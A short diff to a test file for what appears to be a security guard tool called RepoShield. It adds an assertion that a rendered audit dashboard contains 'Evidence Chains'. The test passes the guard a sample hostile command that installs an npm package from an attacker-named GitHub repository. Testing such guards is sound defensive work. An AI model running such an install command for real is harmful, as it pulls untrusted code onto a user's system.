@@ -54,5 +54,6 @@ def test_dashboard_html(tmp_path: Path):
     cp.guard_action("npm install github:attacker/helper-tool", source_ids=[src.source_id])
     out = render_dashboard(tmp_path / "audit.jsonl", tmp_path / "dashboard.html")
     assert out.exists()
-    assert "RepoShield Dashboard" in out.read_text(encoding="utf-8")
-
+    html = out.read_text(encoding="utf-8")
+    assert "RepoShield Dashboard" in html
+    assert "Evidence Chains" in html
